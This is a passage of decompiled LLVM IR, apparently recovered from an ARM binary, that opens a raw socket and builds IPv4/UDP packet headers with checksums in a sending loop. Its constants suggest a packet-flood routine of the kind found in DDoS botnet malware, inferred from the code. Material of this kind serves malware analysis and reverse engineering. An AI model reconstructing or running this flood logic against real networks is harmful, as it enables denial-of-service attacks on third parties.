  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d180, i32* %fp.global-to-local, align 4
  %v0_d194 = load i32, i32* @r4, align 4
  store i32 %v0_d194, i32* %r0.global-to-local, align 4
  %v4_d198 = inttoptr i32 %v0_d184 to i32*
  %v5_d198 = call i32 @function_a4e8(i32 %v0_d194, i32* %v4_d198, i32 4, i32 64)
  %v1_d1a0 = urem i32 %v5_d198, 256
  store i32 %v1_d1a0, i32* %ip.global-to-local, align 4
  %v0_d1a4 = load i32, i32* @r5, align 4
  store i32 %v0_d1a4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d1b0 = load i32, i32* @r4, align 4
  store i32 %v0_d1b0, i32* %r0.global-to-local, align 4
  %v5_d1b4 = trunc i32 %v5_d198 to i8
  %v6_d1b8 = inttoptr i32 %v0_d1a4 to i32*
  %v7_d1b8 = call i32 @function_a4e8(i32 %v0_d1b0, i32* %v6_d1b8, i32 5, i32 0)
  %v1_d1c4 = urem i32 %v7_d1b8, 256
  store i32 %v1_d1c4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d1d0 = load i32, i32* @r5, align 4
  store i32 %v0_d1d0, i32* %r1.global-to-local, align 4
  %v0_d1d4 = load i32, i32* @r4, align 4
  store i32 %v0_d1d4, i32* %r0.global-to-local, align 4
  %v5_d1dc = inttoptr i32 %v0_d1d0 to i32*
  %v6_d1dc = call i32 @function_a4e8(i32 %v0_d1d4, i32* %v5_d1dc, i32 6, i32 65535)
  %v0_d1e4 = load i32, i32* @r5, align 4
  store i32 %v0_d1e4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_d1dc, i32* @r7, align 4
  %v0_d1f4 = load i32, i32* @r4, align 4
  store i32 %v0_d1f4, i32* %r0.global-to-local, align 4
  %v4_d1f8 = inttoptr i32 %v0_d1e4 to i32*
  %v5_d1f8 = call i32 @function_a4e8(i32 %v0_d1f4, i32* %v4_d1f8, i32 7, i32 65535)
  %v0_d1fc = load i32, i32* @r5, align 4
  store i32 %v0_d1fc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_d1f8, i32* %sb.global-to-local, align 4
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* %r0.global-to-local, align 4
  %v4_d210 = inttoptr i32 %v0_d1fc to i32*
  %v5_d210 = call i32 @function_a4e8(i32 %v0_d20c, i32* %v4_d210, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d21c = load i32, i32* @r5, align 4
  store i32 %v0_d21c, i32* %r1.global-to-local, align 4
  store i32 %v5_d210, i32* @r6, align 4
  %v0_d224 = load i32, i32* @r4, align 4
  store i32 %v0_d224, i32* %r0.global-to-local, align 4
  %v4_d228 = inttoptr i32 %v0_d21c to i32*
  %v5_d228 = call i32 @function_a4e8(i32 %v0_d224, i32* %v4_d228, i32 1, i32 1)
  %v2_d234 = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_d234, i32* %r3.global-to-local, align 4
  %v1_d238 = urem i32 %v5_d228, 256
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  %v0_d23c = load i32, i32* @r5, align 4
  store i32 %v0_d23c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_d244 = load i32, i32* @r4, align 4
  store i32 %v0_d244, i32* %r0.global-to-local, align 4
  %v5_d24c = inttoptr i32 %v0_d23c to i32*
  %v6_d24c = call i32 @function_a4e8(i32 %v0_d244, i32* %v5_d24c, i32 25, i32 %v2_d234)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d260 = call i32 @function_13f90(i32 2, i32 3, i32 17)
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v7_d264 = icmp eq i32 %v3_d260, -1
  store i1 %v7_d264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d264, label %dec_label_pc_d68c, label %dec_label_pc_d270

dec_label_pc_d270:                                ; preds = %dec_label_pc_d124
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d278 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d278, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d28c = call i32 @function_13f60(i32 %v3_d260, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_d28c, i32* %r0.global-to-local, align 4
  %v7_d290 = icmp eq i32 %v6_d28c, -1
  store i1 %v7_d290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d290, label %dec_label_pc_d684, label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d270
  %v0_d298 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_d2a4 = urem i32 %v0_d298, 65536
  store i32 %v3_d2a4, i32* %r2.global-to-local, align 4
  %v3_d2a8 = icmp ugt i32 %v3_d2a4, 1459
  %v9_d2a8 = icmp eq i32 %v3_d2a4, 1460
  store i1 %v9_d2a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d2a8, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_d298
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_d298, %bb
  %v0_d2b0 = phi i32 [ %v3_d2a4, %dec_label_pc_d298 ], [ 1460, %bb ]
  %v0_d2b4 = load i32, i32* %fp.global-to-local, align 4
  %v3_d2b4 = mul i32 %v0_d2b4, 65536
  store i32 %v3_d2b4, i32* %r0.global-to-local, align 4
  %v3_d2b8 = urem i32 %v0_d2b4, 65536
  store i32 %v3_d2b8, i32* %r2.global-to-local, align 4
  %v0_d2bc = load i32, i32* @sl, align 4
  %v2_d2bc = icmp eq i32 %v0_d2bc, 0
  store i1 %v2_d2bc, i1* %cpsr_z.global-to-local, align 1
  %v0_d2c0 = load i32, i32* %sb.global-to-local, align 4
  %v0_d2c4 = load i32, i32* @r7, align 4
  %tmp72 = icmp slt i32 %v0_d2bc, 1
  br i1 %tmp72, label %bb73, label %bb74

bb73:                                             ; preds = %bb71
  store i32 %v0_d2b0, i32* %r2.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %bb71, %bb73
  %v5_d2ec = phi i32 [ %v3_d2b8, %bb71 ], [ %v0_d2b0, %bb73 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2d4 = urem i32 %v0_d2c4, 65536
  store i32 %v3_d2d4, i32* %r3.global-to-local, align 4
  %v3_d2d8 = urem i32 %v0_d2c0, 65536
  store i32 %v3_d2d8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp72, label %.thread, label %dec_label_pc_d2f4

.thread:                                          ; preds = %bb74
  %v6_d2e8 = add nsw i32 %v5_d2ec, 28
  store i32 %v6_d2e8, i32* @fp, align 4
  %v6_d2ec = add nsw i32 %v5_d2ec, 8
  store i32 %v6_d2ec, i32* @sb, align 4
  br label %dec_label_pc_d468

dec_label_pc_d2f4:                                ; preds = %bb74
  %v1_d2f8 = add nuw nsw i32 %v0_d2b0, 28
  store i32 %v1_d2f8, i32* @fp, align 4
  %tmp75 = mul nuw nsw i32 %v1_d2f8, 256
  %v1_d304 = and i32 %tmp75, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp76 = udiv i32 %v0_d2b4, 256
  %v3_d308 = urem i32 %tmp76, 256
  %v2_d31c = icmp eq i32 %v1_d1c4, 0
  store i1 %v2_d31c, i1* %cpsr_z.global-to-local, align 1
  %v1_d320 = urem i32 %v0_d2b4, 256
  %v1_d328 = add nuw nsw i32 %v0_d2b0, 8
  store i32 %v1_d328, i32* @sb, align 4
  %v1_d330 = urem i32 %v0_d2c4, 256
  %v1_d334 = urem i32 %v0_d2c0, 256
  store i32 %v1_d334, i32* %ip.global-to-local, align 4
  store i32 %v1_d304, i32* %r3.global-to-local, align 4
  %tmp77 = mul nuw nsw i32 %v1_d328, 256
  %v4_d340 = mul nuw nsw i32 %v1_d320, 256
  %v5_d340 = or i32 %v4_d340, %v3_d308
  store i32 %v5_d340, i32* %r0.global-to-local, align 4
  %v3_d344 = mul nuw nsw i32 %v1_d330, 256
  store i32 %v3_d344, i32* %r2.global-to-local, align 4
  %tmp78 = udiv i32 %v0_d2c0, 256
  %v3_d348 = urem i32 %tmp78, 256
  %v1_d34c = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  store i32 %v1_d34c, i32* %r1.global-to-local, align 4
  %tmp79 = udiv i32 %v1_d2f8, 256
  %v4_d350 = urem i32 %tmp79, 256
  %v5_d350 = or i32 %v4_d350, %v1_d304
  store i32 %v5_d350, i32* @lr, align 4
  %tmp80 = udiv i32 %v0_d2c4, 256
  %v4_d354 = urem i32 %tmp80, 256
  %v5_d354 = or i32 %v4_d354, %v3_d344
  store i32 %v5_d354, i32* @r4, align 4
  %v5_d358 = trunc i32 %tmp79 to i8
  %v5_d35c = trunc i32 %tmp76 to i8
  %v4_d360 = mul nuw nsw i32 %v1_d334, 256
  %v5_d360 = or i32 %v4_d360, %v3_d348
  store i32 %v5_d360, i32* @r5, align 4
  %tmp81 = udiv i32 %v1_d328, 256
  %v4_d364 = urem i32 %tmp81, 256
  %v5_d364 = or i32 %v4_d364, %v1_d34c
  store i32 %v5_d364, i32* @r7, align 4
  br i1 %v2_d31c, label %dec_label_pc_d36c, label %dec_label_pc_d694

dec_label_pc_d36c:                                ; preds = %dec_label_pc_d2f4
  %v3_d36c36 = udiv i32 %v1_d304, 256
  store i32 %v3_d36c36, i32* %ip.global-to-local, align 4
  store i32 %v1_d320, i32* %r0.global-to-local, align 4
  store i32 %v1_d330, i32* %r1.global-to-local, align 4
  store i32 %v1_d334, i32* %r2.global-to-local, align 4
  %v3_d37c37 = udiv i32 %v1_d34c, 256
  store i32 %v3_d37c37, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v4_d3e0 = sext i8 %v5_d17c to i32
  %v4_d420 = sext i8 %v5_d35c to i32
  %sext15 = mul i32 %v0_d2b4, 16777216
  %v4_d424 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v0_d2c4, 16777216
  %v4_d43c = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_d34c, 65536
  %v4_d440 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_d2c0, 16777216
  %v4_d444 = sdiv i32 %sext18, 16777216
  %v1_d42c = trunc i32 %v3_d36c36 to i8
  %v1_d44c = trunc i32 %v4_d440 to i8
  br label %dec_label_pc_d398

dec_label_pc_d398:                                ; preds = %dec_label_pc_d398, %dec_label_pc_d36c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d3a4 = call i32 @function_14294(i32 1510, i32 1)
  store i32 %v2_d3a4, i32* %r0.global-to-local, align 4
  store i32 %v2_d144, i32* %ip.global-to-local, align 4
  %v3_d3ac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d3ac, i32* %r2.global-to-local, align 4
  %v2_d3b0 = load i32, i32* @r6, align 4
  %v5_d3b0 = mul i32 %v2_d3b0, 4
  %v6_d3b0 = add i32 %v5_d3b0, %v2_d144
  %v7_d3b0 = inttoptr i32 %v6_d3b0 to i32*
  store i32 %v2_d3a4, i32* %v7_d3b0, align 4
  %v0_d3b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_d3b4 = load i32, i32* %r2.global-to-local, align 4
  %v4_d3b4 = mul i32 %v1_d3b4, 4
  %v5_d3b4 = add i32 %v4_d3b4, %v0_d3b4
  %v6_d3b4 = inttoptr i32 %v5_d3b4 to i32*
  %v7_d3b4 = load i32, i32* %v6_d3b4, align 4
  store i32 %v7_d3b4, i32* %r1.global-to-local, align 4
  %v1_d3b8 = inttoptr i32 %v7_d3b4 to i8*
  %v2_d3b8 = load i8, i8* %v1_d3b8, align 1
  %tmp = urem i8 %v2_d3b8, 16
  %v1_d3bc = zext i8 %tmp to i32
  %v1_d3c0 = or i32 %v1_d3bc, 64
  store i32 %v1_d3c0, i32* %r3.global-to-local, align 4
  %v1_d3c4 = trunc i32 %v1_d3c0 to i8
  store i8 %v1_d3c4, i8* %v1_d3b8, align 1
  %v0_d3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d3c8 = inttoptr i32 %v0_d3c8 to i8*
  %v2_d3c8 = load i8, i8* %v1_d3c8, align 1
  %v3_d3c8 = zext i8 %v2_d3c8 to i32
  %v1_d3cc = and i32 %v3_d3c8, 240
  %v1_d3d0 = or i32 %v1_d3cc, 5
  store i32 %v1_d3d0, i32* %r2.global-to-local, align 4
  %v3_d3d8 = add i32 %v0_d3c8, 9
  %v4_d3d8 = inttoptr i32 %v3_d3d8 to i8*
  store i8 17, i8* %v4_d3d8, align 1
  %v0_d3dc = load i32, i32* %r2.global-to-local, align 4
  %v1_d3dc = trunc i32 %v0_d3dc to i8
  %v2_d3dc = load i32, i32* %r1.global-to-local, align 4
  %v3_d3dc = inttoptr i32 %v2_d3dc to i8*
  store i8 %v1_d3dc, i8* %v3_d3dc, align 1
  store i32 %v4_d3e0, i32* %r0.global-to-local, align 4
  %v2_d3e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_d3e4 = add i32 %v2_d3e4, 1
  %v4_d3e4 = inttoptr i32 %v3_d3e4 to i8*
  store i8 %v5_d17c, i8* %v4_d3e4, align 1
  %v2_d3ec = load i32, i32* %r1.global-to-local, align 4
  %v3_d3ec = add i32 %v2_d3ec, 8
  %v4_d3ec = inttoptr i32 %v3_d3ec to i8*
  store i8 %v5_d1b4, i8* %v4_d3ec, align 1
  %v3_d3f0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d3f0, i32* %r2.global-to-local, align 4
  store i32 %v6_d24c, i32* %ip.global-to-local, align 4
  %v3_d3f8 = mul i32 %v3_d3f0, 32
  store i32 %v3_d3f8, i32* %r3.global-to-local, align 4
  %v1_d3fc = load i32, i32* %r1.global-to-local, align 4
  %v2_d3fc = add i32 %v1_d3fc, 12
  %v3_d3fc = inttoptr i32 %v2_d3fc to i32*
  store i32 %v6_d24c, i32* %v3_d3fc, align 4
  %v0_d400 = load i32, i32* %r3.global-to-local, align 4
  %v1_d400 = load i32, i32* %r2.global-to-local, align 4
  %tmp84 = mul i32 %v1_d400, -8
  %v5_d400 = add i32 %v0_d400, %tmp84
  %v1_d404 = load i32, i32* @r8, align 4
  %v2_d404 = add i32 %v5_d400, %v1_d404
  store i32 %v2_d404, i32* %r3.global-to-local, align 4
  %v1_d408 = add i32 %v2_d404, 16
  %v2_d408 = inttoptr i32 %v1_d408 to i32*
  %v3_d408 = load i32, i32* %v2_d408, align 4
  %v1_d40c = load i32, i32* %r1.global-to-local, align 4
  %v2_d40c = add i32 %v1_d40c, 16
  %v3_d40c = inttoptr i32 %v2_d40c to i32*
  store i32 %v3_d408, i32* %v3_d40c, align 4
  %v0_d414 = load i32, i32* %r2.global-to-local, align 4
  %v1_d414 = add i32 %v0_d414, 1
  store i32 %v1_d414, i32* @r6, align 4
  %v2_d418 = load i32, i32* %r1.global-to-local, align 4
  %v3_d418 = add i32 %v2_d418, 2
  %v4_d418 = inttoptr i32 %v3_d418 to i8*
  store i8 %v5_d358, i8* %v4_d418, align 1
  store i32 %v4_d420, i32* %ip.global-to-local, align 4
  store i32 %v4_d424, i32* %r0.global-to-local, align 4
  %v0_d428 = load i32, i32* %r1.global-to-local, align 4
  %v1_d428 = add i32 %v0_d428, 20
  store i32 %v1_d428, i32* %r3.global-to-local, align 4
  %v3_d42c = add i32 %v0_d428, 3
  %v4_d42c = inttoptr i32 %v3_d42c to i8*
  store i8 %v1_d42c, i8* %v4_d42c, align 1
  %v0_d430 = load i32, i32* %ip.global-to-local, align 4
  %v1_d430 = trunc i32 %v0_d430 to i8
  %v2_d430 = load i32, i32* %r1.global-to-local, align 4
  %v3_d430 = add i32 %v2_d430, 4
  %v4_d430 = inttoptr i32 %v3_d430 to i8*
  store i8 %v1_d430, i8* %v4_d430, align 1
  %v0_d434 = load i32, i32* %r0.global-to-local, align 4
  %v1_d434 = trunc i32 %v0_d434 to i8
  %v2_d434 = load i32, i32* %r1.global-to-local, align 4
  %v3_d434 = add i32 %v2_d434, 5
  %v4_d434 = inttoptr i32 %v3_d434 to i8*
  store i8 %v1_d434, i8* %v4_d434, align 1
  %v0_d438 = load i32, i32* @r4, align 4
  %v1_d438 = trunc i32 %v0_d438 to i8
  %v2_d438 = load i32, i32* %r1.global-to-local, align 4
  %v3_d438 = add i32 %v2_d438, 20
  %v4_d438 = inttoptr i32 %v3_d438 to i8*
  store i8 %v1_d438, i8* %v4_d438, align 1
  store i32 %v4_d43c, i32* %r2.global-to-local, align 4
  store i32 %v4_d440, i32* %r1.global-to-local, align 4
  store i32 %v4_d444, i32* %ip.global-to-local, align 4
  %v0_d448 = load i32, i32* @r6, align 4
  %v1_d448 = load i32, i32* @sl, align 4
  %v9_d448 = icmp eq i32 %v0_d448, %v1_d448
  store i1 %v9_d448, i1* %cpsr_z.global-to-local, align 1
  %v2_d44c = load i32, i32* %r3.global-to-local, align 4
  %v3_d44c = add i32 %v2_d44c, 5
  %v4_d44c = inttoptr i32 %v3_d44c to i8*
  store i8 %v1_d44c, i8* %v4_d44c, align 1
  %v0_d450 = load i32, i32* %r2.global-to-local, align 4
  %v1_d450 = trunc i32 %v0_d450 to i8
  %v2_d450 = load i32, i32* %r3.global-to-local, align 4
  %v3_d450 = add i32 %v2_d450, 1
  %v4_d450 = inttoptr i32 %v3_d450 to i8*
  store i8 %v1_d450, i8* %v4_d450, align 1
  %v0_d454 = load i32, i32* @r5, align 4
  %v1_d454 = trunc i32 %v0_d454 to i8
  %v2_d454 = load i32, i32* %r3.global-to-local, align 4
  %v3_d454 = add i32 %v2_d454, 2
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v1_d454, i8* %v4_d454, align 1
  %v0_d458 = load i32, i32* %ip.global-to-local, align 4
  %v1_d458 = trunc i32 %v0_d458 to i8
  %v2_d458 = load i32, i32* %r3.global-to-local, align 4
  %v3_d458 = add i32 %v2_d458, 3
  %v4_d458 = inttoptr i32 %v3_d458 to i8*
  store i8 %v1_d458, i8* %v4_d458, align 1
  %v0_d45c = load i32, i32* @r7, align 4
  %v1_d45c = trunc i32 %v0_d45c to i8
  %v2_d45c = load i32, i32* %r3.global-to-local, align 4
  %v3_d45c = add i32 %v2_d45c, 4
  %v4_d45c = inttoptr i32 %v3_d45c to i8*
  store i8 %v1_d45c, i8* %v4_d45c, align 1
  %v0_d460 = load i32, i32* @r6, align 4
  store i32 %v0_d460, i32* %stack_var_-40, align 4
  %v5_d464 = icmp slt i32 %v0_d448, %v1_d448
  br i1 %v5_d464, label %dec_label_pc_d398, label %dec_label_pc_d468

dec_label_pc_d468:                                ; preds = %dec_label_pc_d6c8, %dec_label_pc_d398, %.thread
  %v0_d468 = load i32, i32* @sl, align 4
  %v2_d468 = icmp eq i32 %v0_d468, 0
  store i1 %v2_d468, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d614 = icmp eq i32 %v3_d2b8, 65535
  %v2_d4e0 = icmp eq i32 %v1_d238, 0
  %v2_d4a8 = icmp eq i32 %v6_d24c, -1
  %v7_d4a8 = icmp eq i32 %v6_d24c, -1
  br label %dec_label_pc_d470.outer

dec_label_pc_d470.outer:                          ; preds = %dec_label_pc_d590, %dec_label_pc_d468
  %v1_d470.ph.in = phi i32 [ %v1_d584, %dec_label_pc_d590 ], [ %v0_d468, %dec_label_pc_d468 ]
  %v0_d470.ph = phi i1 [ %v2_d590, %dec_label_pc_d590 ], [ %v2_d468, %dec_label_pc_d468 ]
  %v1_d470.ph = icmp slt i32 %v1_d470.ph.in, 0
  %v4_d470 = or i1 %v1_d470.ph, %v0_d470.ph
  br label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d470.outer, %dec_label_pc_d470
  br i1 %v4_d470, label %dec_label_pc_d470, label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d470
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d4e8, %dec_label_pc_d474
  %v1_d494 = phi i32 [ %v1_d580, %dec_label_pc_d4e8 ], [ 0, %dec_label_pc_d474 ]
  %v5_d484 = mul i32 %v1_d494, 24
  %v1_d488 = load i32, i32* @r8, align 4
  %v2_d488 = add i32 %v1_d488, %v5_d484
  store i32 %v2_d488, i32* %r3.global-to-local, align 4
  store i32 %v2_d144, i32* %ip.global-to-local, align 4
  %v1_d490 = add i32 %v2_d488, 20
  %v2_d490 = inttoptr i32 %v1_d490 to i8*
  %v3_d490 = load i8, i8* %v2_d490, align 1
  %v4_d490 = zext i8 %v3_d490 to i32
  store i32 %v4_d490, i32* %r2.global-to-local, align 4
  %v4_d494 = mul i32 %v1_d494, 4
  %v5_d494 = add i32 %v4_d494, %v2_d144
  %v6_d494 = inttoptr i32 %v5_d494 to i32*
  %v7_d494 = load i32, i32* %v6_d494, align 4
  store i32 %v7_d494, i32* @r5, align 4
  %v7_d498 = icmp eq i8 %v3_d490, 31
  store i1 %v7_d498, i1* %cpsr_z.global-to-local, align 1
  %v1_d49c = add i32 %v7_d494, 20
  store i32 %v1_d49c, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_d490, 32
  br i1 %tmp85, label %dec_label_pc_d59c, label %dec_label_pc_d4a4

dec_label_pc_d4a4:                                ; preds = %dec_label_pc_d480
  store i32 %v6_d24c, i32* %r0.global-to-local, align 4
  store i1 %v7_d4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d4a8, label %dec_label_pc_d604, label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d59c, %dec_label_pc_d4a4
  store i32 %v3_d2b8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d614, label %dec_label_pc_d620, label %dec_label_pc_d4c4

dec_label_pc_d4c4:                                ; preds = %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge, %dec_label_pc_d4b0
  %v1_d4c8 = phi i32 [ %v1_d4c8.pre, %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge ], [ 65535, %dec_label_pc_d4b0 ]
  store i32 %v3_d2d4, i32* %r2.global-to-local, align 4
  %v9_d4c8 = icmp eq i32 %v3_d2d4, %v1_d4c8
  store i1 %v9_d4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4c8, label %dec_label_pc_d63c, label %dec_label_pc_d4d0

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge, %dec_label_pc_d4c4
  %v1_d4d4 = phi i32 [ %v1_d4d4.pre, %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge ], [ %v1_d4c8, %dec_label_pc_d4c4 ]
  store i32 %v3_d2d8, i32* %r3.global-to-local, align 4
  %v9_d4d4 = icmp eq i32 %v3_d2d8, %v1_d4d4
  store i1 %v9_d4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4d4, label %dec_label_pc_d658, label %dec_label_pc_d4dc

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d63c, %dec_label_pc_d4d0
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  store i1 %v2_d4e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d4e0, label %dec_label_pc_d4e8, label %dec_label_pc_d674

dec_label_pc_d4e8:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d658, %dec_label_pc_d674
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d4ec = load i32, i32* @r7, align 4
  %v1_d4ec = trunc i32 %v0_d4ec to i8
  %v2_d4ec = load i32, i32* @r5, align 4
  %v3_d4ec = add i32 %v2_d4ec, 10
  %v4_d4ec = inttoptr i32 %v3_d4ec to i8*
  store i8 %v1_d4ec, i8* %v4_d4ec, align 1
  %v0_d4f0 = load i32, i32* @r7, align 4
  %v1_d4f0 = trunc i32 %v0_d4f0 to i8
  %v2_d4f0 = load i32, i32* @r5, align 4
  %v3_d4f0 = add i32 %v2_d4f0, 11
  %v4_d4f0 = inttoptr i32 %v3_d4f0 to i8*
  store i8 %v1_d4f0, i8* %v4_d4f0, align 1
  %v0_d4f4 = load i32, i32* @r5, align 4
  store i32 %v0_d4f4, i32* @r0, align 4
  %v2_d4f8 = call i32 @function_e424(i32 %v0_d4f4, i32 20)
  %v3_d4f8 = trunc i32 %v2_d4f8 to i8
  store i32 %v2_d4f8, i32* %r0.global-to-local, align 4
  %v4_d4fc = sdiv i32 %v2_d4f8, 256
  store i32 %v4_d4fc, i32* %r3.global-to-local, align 4
  %v1_d500 = trunc i32 %v4_d4fc to i8
  %v2_d500 = load i32, i32* @r5, align 4
  %v3_d500 = add i32 %v2_d500, 11
  %v4_d500 = inttoptr i32 %v3_d500 to i8*
  store i8 %v1_d500, i8* %v4_d500, align 1
  %v3_d504 = load i32, i32* @r5, align 4
  %v4_d504 = add i32 %v3_d504, 10
  %v5_d504 = inttoptr i32 %v4_d504 to i8*
  store i8 %v3_d4f8, i8* %v5_d504, align 1
  %v0_d508 = load i32, i32* @r7, align 4
  %v1_d508 = trunc i32 %v0_d508 to i8
  %v2_d508 = load i32, i32* @r6, align 4
  %v3_d508 = add i32 %v2_d508, 6
  %v4_d508 = inttoptr i32 %v3_d508 to i8*
  store i8 %v1_d508, i8* %v4_d508, align 1
  %v0_d50c = load i32, i32* @r7, align 4
  %v1_d50c = trunc i32 %v0_d50c to i8
  %v2_d50c = load i32, i32* @r6, align 4
  %v3_d50c = add i32 %v2_d50c, 7
  %v4_d50c = inttoptr i32 %v3_d50c to i8*
  store i8 %v1_d50c, i8* %v4_d50c, align 1
  %v0_d510 = load i32, i32* @r5, align 4
  %v1_d510 = add i32 %v0_d510, 24
  %v2_d510 = inttoptr i32 %v1_d510 to i8*
  %v3_d510 = load i8, i8* %v2_d510, align 1
  %v4_d510 = zext i8 %v3_d510 to i32
  store i32 %v4_d510, i32* %r3.global-to-local, align 4
  %v1_d514 = add i32 %v0_d510, 25
  %v2_d514 = inttoptr i32 %v1_d514 to i8*
  %v3_d514 = load i8, i8* %v2_d514, align 1
  %v4_d514 = zext i8 %v3_d514 to i32
  %v0_d518 = load i32, i32* @r6, align 4
  store i32 %v0_d518, i32* @r1, align 4
  %v4_d51c = mul nuw nsw i32 %v4_d514, 256
  %v5_d51c = or i32 %v4_d51c, %v4_d510
  store i32 %v5_d51c, i32* %r2.global-to-local, align 4
  store i32 %v0_d510, i32* %r0.global-to-local, align 4
  %v0_d524 = load i32, i32* @sb, align 4
  store i32 %v0_d524, i32* %r3.global-to-local, align 4
  %v4_d528 = call i32 @function_e480(i32 %v0_d510, i32 %v0_d518, i32 %v5_d51c, i32 %v0_d524)
  %v5_d528 = trunc i32 %v4_d528 to i8
  store i32 %v4_d528, i32* %r0.global-to-local, align 4
  %v4_d52c38 = udiv i32 %v4_d528, 256
  %v1_d530 = trunc i32 %v4_d52c38 to i8
  %v2_d530 = load i32, i32* @r6, align 4
  %v3_d530 = add i32 %v2_d530, 7
  %v4_d530 = inttoptr i32 %v3_d530 to i8*
  store i8 %v1_d530, i8* %v4_d530, align 1
  %v3_d534 = load i32, i32* @r6, align 4
  %v4_d534 = add i32 %v3_d534, 6
  %v5_d534 = inttoptr i32 %v4_d534 to i8*
  store i8 %v5_d528, i8* %v5_d534, align 1
  %v3_d538 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d538, i32* %r3.global-to-local, align 4
  %v0_d53c = load i32, i32* @r5, align 4
  %v1_d53c = add i32 %v0_d53c, 20
  %v2_d53c = inttoptr i32 %v1_d53c to i32*
  %v3_d53c = load i32, i32* %v2_d53c, align 4
  %v3_d544 = udiv i32 %v3_d53c, 65536
  store i32 %v3_d544, i32* %r2.global-to-local, align 4
  %v5_d548 = mul i32 %v3_d538, 24
  %v1_d54c = load i32, i32* @r8, align 4
  %v2_d54c = add i32 %v1_d54c, %v5_d548
  store i32 %v2_d54c, i32* %ip.global-to-local, align 4
  %v3_d55035 = udiv i32 %v3_d53c, 16777216
  %v1_d554 = trunc i32 %v3_d55035 to i8
  %v3_d554 = add i32 %v2_d54c, 3
  %v4_d554 = inttoptr i32 %v3_d554 to i8*
  store i8 %v1_d554, i8* %v4_d554, align 1
  %v0_d558 = load i32, i32* %r2.global-to-local, align 4
  %v1_d558 = trunc i32 %v0_d558 to i8
  %v2_d558 = load i32, i32* %ip.global-to-local, align 4
  %v3_d558 = add i32 %v2_d558, 2
  %v4_d558 = inttoptr i32 %v3_d558 to i8*
  store i8 %v1_d558, i8* %v4_d558, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
